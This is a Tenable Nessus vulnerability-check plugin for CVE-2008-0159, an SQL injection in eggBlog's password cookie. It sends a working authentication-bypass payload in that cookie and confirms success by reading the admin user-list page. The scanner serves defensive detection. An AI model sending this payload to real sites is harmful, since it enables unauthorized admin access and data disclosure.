#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description)
{
  script_id(29927);
  script_version("$Revision: 1.10 $");

  script_cve_id("CVE-2008-0159");
  script_bugtraq_id(27168);
  script_xref(name:"OSVDB", value:"40209");

  script_name(english:"eggBlog index.php eggblogpassword Variable Cookie SQL Injection");
  script_summary(english:"Tries to bypass authentication using SQL injection");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is prone to a
SQL injection attack." );
 script_set_attribute(attribute:"description", value:
"The remote host is running eggBlog, a free PHP and MySQL blog software
package. 

The version of eggBlog installed on the remote host fails to sanitize
input to the 'eggblogpassword' cookie before using it in
'_etc/header.php' to construct database queries.  Provided PHP's
'magic_quotes_gpc' setting is disabled, an attacker may be able to
exploit this issue to manipulate database queries to disclose
sensitive information, bypass authentication, modify data, or even
attack the underlying database." );
 script_set_attribute(attribute:"see_also", value:"http://www.milw0rm.com/exploits/4860" );
 script_set_attribute(attribute:"solution", value:
"Unknown at this time." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:P" );
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2008-2009 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");


port = get_http_port(default:80, embedded: 0);
if (!can_host_php(port:port)) exit(0);


# Loop through directories.
if (thorough_tests) dirs = list_uniq(make_list("/eggblog", "/blog", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs)
{
  init_cookiejar();
  set_http_cookie(name: "eggblogemail", value: "%");
  set_http_cookie(name: "eggblogpassword", value: "' or 1=0 UNION SELECT 2--");
  r = http_send_recv3(method: 'GET', item:string(dir, "/admin/users.php"), port:port);
  if (isnull(r)) exit(0);

  # There's a problem if we're logged in.
  if (
    ">powered by eggblog" >< r[2] &&
    (
      "The following users are registered" >< r[2] ||
      '<a href="users.php?delete=' >< r[2] ||
      "The following IP's are currently banned" >< r[2]
    )
  )
  {
    security_warning(port);
    set_kb_item(name: 'www/'+port+'/SQLInjection', value: TRUE);
    exit(0);
  }
}
